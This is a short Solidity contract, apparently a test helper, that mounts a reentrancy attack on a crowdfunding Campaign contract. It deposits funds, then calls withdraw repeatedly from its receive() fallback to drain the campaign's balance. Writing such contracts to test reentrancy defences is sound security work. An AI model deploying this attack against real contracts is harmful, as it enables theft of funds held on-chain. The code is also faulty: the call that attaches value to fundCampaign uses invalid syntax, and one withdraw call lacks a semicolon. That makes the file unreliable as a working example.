// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Campaign} from '../../src/Campaign.sol';

contract ReentrancyAttack{
    Campaign public campaign;
    uint256 public attackAmount;


    constructor(address _campaign){
        campaign = Campaign(_campaign);
    }

    function attack() external payable{
        attackAmount = msg.value;

        campaign{value: msg.value}.fundCampaign();

        campaign.withdraw(0);
    }

    receive() external payable{

        if(address(campaign).balance >= attackAmount){
            campaign.withdraw(0)
        }
    }
}